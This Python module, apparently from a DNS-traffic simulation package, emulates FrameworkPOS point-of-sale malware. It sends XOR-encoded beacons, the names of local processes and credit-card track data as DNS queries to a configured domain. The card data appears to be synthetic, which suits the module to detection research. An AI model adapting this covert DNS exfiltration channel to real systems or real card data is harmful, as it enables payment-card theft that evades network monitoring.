import asyncio
import random

import psutil

from tdns.exfil import exfil, limit_size, SEND_GETHOST


class frameworkpos(exfil):

    idchar = 'f'

    def __init__(self, card_type=None, id_bytesize=4, xor_key=0xf2,
                 proc_nums=2, beacon_delay=300, amount=5000, time=1,
                 method=SEND_GETHOST, resolver_addr=None, random_delay=False,
                 prepend=True):
        '''
        args:
            card_type: The type of credit cards to exfiltrate
                       (maestro, mastercard, visa).
                       Value None will choose randomly.

            id_bytesize: The size (in bytes) of the id that gets
                         assigned to the infected machine.

            xor_key: Clear from the name.

            proc_nums: The number of processes to exfiltrate
                       (number of 'alert' messages).

            beacon_delay: The delay between 'beacon' messages.

            amount: The total amount of DNS queries, excluding beacons.
        '''
        super().__init__(
            amount, time, method, resolver_addr, random_delay, prepend)
        self.card_type = card_type
        self.id = hex(random.getrandbits(8 * id_bytesize))[2:]
        self.xor_key = xor_key
        self.proc_names = [proc.info['name']
                           for proc in psutil.process_iter(['name'])][-proc_nums:]
        self.alert_cues = sorted(
            [random.randint(1, self.amount - 1) for _ in range(proc_nums - 1)])
        self.beacon_delay = beacon_delay
        self.hostname = self.data.hostname()
        self.ipv4 = self.data.ipv4()

    def encode(self, text):
        return ''.join(list(map(lambda x: hex(x)[2:], (ord(c) ^ self.xor_key for c in text))))

    '''
    The following 3 methods are for the 3 different requests used by FrameworkPOS
    '''
    @limit_size
    def beacon(self):
        return f'{self.id}.beacon.{self.encode(self.hostname)}.{self.encode(self.ipv4)}.{self.domain}'

    @limit_size
    def alert(self):
        name = self.proc_names.pop()
        return f'{self.id}.alert.{self.encode(name)}.{self.domain}'

    @limit_size
    def card(self):
        to_send = self.custom_data.track_two(self.card_type)[1:-1].split('=')
        return f'{self.id}.{self.encode(to_send[0])}.{self.encode(to_send[1])}.{self.domain}'

    async def heartbeat(self):
        while self.amount > 0:
            qname = self.beacon()
            await self.method(qname)
            await asyncio.sleep(self.beacon_delay)

    async def exfiltration(self):
        qname = self.alert()  # first alert
        self.amount -= 1
        await self.method(qname)

        while self.amount > 0:
            # check if an alert should be sent
            if self.alert_cues and self.amount <= self.alert_cues[-1]:
                self.alert_cues.pop()
                qname = self.alert()
                self.amount -= 1
                await self.method(qname)
                await asyncio.sleep(self.delay())

            qname = self.card()
            self.amount -= 1
            await self.method(qname)
            await asyncio.sleep(self.delay())

    async def call__aux(self):
        hrtbt = asyncio.create_task(self.heartbeat())
        crds = asyncio.create_task(self.exfiltration())
        await hrtbt
        await asyncio.sleep(self.delay())
        await crds
